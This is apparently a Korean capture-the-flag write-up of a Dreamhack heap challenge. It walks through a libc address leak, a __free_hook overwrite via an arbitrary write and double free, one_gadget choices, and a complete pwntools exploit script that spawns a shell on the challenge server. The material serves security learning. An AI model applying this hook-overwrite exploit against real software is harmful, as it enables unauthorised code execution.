# 바이너리 분석

```
// gcc -o init_fini_array init_fini_array.c -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);

    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}
```

## 1. Leak libc base

바이너리의 `printf("stdout: %p\n", stdout);` 를 통해, `libc`의 `_IO_2_1_stdout_` 이 메모리에 매핑된 주소를 알 수 있고, `stdout`의 오프셋을 해당 메모리 주소에서 빼주면 `libc_base`를 구할 수 있다.

## 2. Hook Overwrite

바이너리의 다음 부분을 잘 보면, `scanf("%ld", &size);`를 통해 `size` 변수에 값을 입력할 수 있다. 이 변수를 통해 바로 아랫 줄의 `long *ptr`에 `ptr = malloc(size);` 를 통해 `size` 만큼 동적 할당을 할 수 있다.

그리고, `read(0, ptr, size);`를 통해 `size` 만큼 `ptr`이 가리키는 주소에 값을 대입할 수 있다. (`ptr`에 `read`를 하면 `ptr` 포인터 변수 자체의 값에 입력을 받는게 아니라 `ptr` 포인터가 가리키는 메모리 주소에 입력을 하게 된다.)

여기서, `ptr`에 임의의 값을 대입할 수 있다는 것을 알 수 있고, 바로 아래에서 `*(long *)*ptr = *(ptr+1);` 부분을 집중해서 보자.

1. `ptr`이 가리키는 메모리에 저장된 값인 `*ptr` 자체를 `long *`인 포인터로 해석하여 해당 메모리에 저장된 값을 주소 값으로 해석한다.

2. 그리고 다시 한번 `*`를 통해 해석한 주소가 가리키는 값에 `ptr + 1`이 가리키는 값인 `*(ptr + 1)`을 대입해주게 된다.

해당 부분을 아래와 같이 그림으로 그려서 보면 더욱 직관적으로 이해할 수 있고, `*ptr`에 `__free_hook`의 주소를 대입한 후, `*(ptr + 1)`에 Overwrite할 함수의 주소를 대입하면 Hook Overwrite를 완료할 수 있다.

<img width="1072" alt="image" src="https://github.com/user-attachments/assets/524612fa-4e2c-421a-83c6-84ce7146a19f">

이제 위의 `scanf("%ld", &size);`과 `read(0, ptr, size);`을 활용하면,

1. `scanf("%ld", &size);`를 통해 `size`에 `16`을 대입해줘야 `long` 크기인 `*ptr`, `*(ptr + 1)` 두 메모리에 값을 대입할 수 있고,

2. `read(0, ptr, size);`를 통해 `__free_hook 주소 + Overwrite할 함수`를 대입해줘야 Hook Overwrite를 진행할 수 있다.

## 3. Overwrite 함수 정하기

바이너리의 바로 아래를 보면 `free(ptr)`을 두번 한 후, `system("/bin/sh");`을 통해 쉘을 실행하게 된다. 

해당 바이너리에서 위와 같이 아무 조작을 해주지 않으면, `free(ptr);`이 두번 실행되어 이미 해제된 주소를 한번 더 해제되게 되어 바이너리가 종료되어 `system("/bin/sh");`을 실행할 수 없게 되어 쉘을 획득할 수 없다.

따라서, 처음에는 `system("/bin/sh)"`은 신경쓰지 않고 어쩌피 Hook Overwrite가 가능하니까, `__free_hook`이 원가젯을 가리키도록 하여 쉘을 획득하려고 했다.

해당 바이너리에 사용된 libc 라이브러리의 원가젯과 조건은 아래와 같다.

<img width="830" alt="image" src="https://github.com/user-attachments/assets/a82bd960-f192-4d35-b9f4-c97f7cec1f68">

그리고 gdb를 통해 `free`를 호출하기 직전 상태는 아래와 같은데, 처음에 잘못봐서 `[rsp + 0x50] == NULL` 인 조건의 원가젯이 사용이 가능하다고 생각하여 `*(ptr + 1)`에 해당 원가젯의 주소를 대입하려고 했는데 안됬다.

<img width="308" alt="image" src="https://github.com/user-attachments/assets/34457b09-c083-4bd5-b4cc-23d34a4386f6">

오히려, 세 원가젯 중 `[rsp + 0x30] == NULL`인 원가젯만 익스플로잇이 가능했고, 인자를 설정해주지 않은 `system` 함수나 `write`, `read` 등 라이브러리의 아무 함수나 Overwrite 해줘도 익스플로잇이 가능했다.

***이 부분은 일단 `free(ptr);`이 원래의 수행을 하지 않으면서 종료되지 않으면, 결국 `system("/bin/sh");`을 최종적으로 수행하기 때문인 것 같은데 왜 인자를 전달해주지 않아도 오류가 발생하지 않는지, 세 원가젯 중 하나만 가능한지는 질문을 올려본 후 다시 공부해보고 작성하겠다.***

사실 원래 정석 풀이는 바이너리에 존재하는 `system("/bin/sh")`을 실행하는 `instruction`의 주소를 `*(ptr + 1)`에 저장하는 것이었다.

이를 위해서는 gdb의 `disassemble main`을 통해 아래와 같이 해당 코드의 주소를 알 수 있다.

<img width="593" alt="image" src="https://github.com/user-attachments/assets/192801dc-32dd-46db-864c-dae5773dd807">

해당 스크린샷을 보면, `0x0000000000400a11 <+199>:   mov    edi,0x400aeb` 에서 바로 아래의 `system` 함수를 실행하기 전 인자를 설정해주는 것이 보인다.

`0x400aeb`는 `x/s`를 통해서 확인해보면 `"/bin/sh"` 문자열이 저장된 주소임을 알 수 있다.

<img width="233" alt="image" src="https://github.com/user-attachments/assets/abd9b56c-fc7f-40f8-9cc9-8dd5eb0a2369">

따라서, `*(ptr + 1)`에 `0x400a11`을 대입해주면 `__free_hook`이 호출될 경우 `0x400a11`로 이동해서 인자를 설정 후 `system` 함수를 실행하는 `main`의 루틴을 따라가게 될 것이다. 이렇게 익스플로잇이 가능한 이유는 아래의 두 이유 때문이다.

1. `0x400a11`로 이동하면 오류가 발생하기 전에는 `instruction`을 순차적으로 수행한다.

2. 해당 바이너리는 코드 영역의 주소를 랜덤화하는 `PIE`가 적용되어 있지 않기 때문에 `0x400a11`이라는 고정된 가상 주소를 사용할 수 있다.

만약 `PIE`가 적용되었다면 아래와 같이 고정된 가상 주소가 아닌 코드 영역의 베이스 주소에 더하는 오프셋으로 나타나기 때문에, 코드 영역의 베이스 주소를 알아야 할 것이다.

<img width="560" alt="image" src="https://github.com/user-attachments/assets/30e7952c-437c-460b-a0b5-71106c5a11a7">

# Exploit 코드

```
from pwn import *

context.arch = "amd64"

p = remote("host3.dreamhack.games", 17398)
elf = ELF("./hook")
libc = ELF("./libc-2.23.so")

# [1] Leak libc base
p.recvuntil(b"stdout: ")
libc_stdout = int(p.recvline()[:-1], 16)
libc_base = libc_stdout - libc.symbols["_IO_2_1_stdout_"]

free_hook = libc_base + libc.symbols["__free_hook"]
sh = 0x400a11  # mov rdi, 0x400aeb : "/bin/sh" 의 주소

p.sendline(str(16).encode())
p.send(p64(free_hook) + p64(sh))

# libc_system = libc_base + libc.symbols["system"]
# read = libc_base + libc.symbols["read"]
# write = libc_base + libc.symbols["write"]

# og = libc_base + 0x4527A  # [rsp+0x30] == NULL : 이것만 실제 exploit이 됨
# og = libc_base + 0xf03a4  # [rsp+0x50] == NULL : 이게 조건을 만족하는데
# og = libc_base + 0xf1247 # [rsp+0x70] == NULL

# system, write, read 다 되는데 왜 첫번째 og만 될까?
# p.send(p64(free_hook) + p64(og))
# p.send(p64(free_hook) + p64(system))
# p.send(p64(free_hook) + p64(write))
# p.send(p64(free_hook) + p64(read))

p.interactive()
```
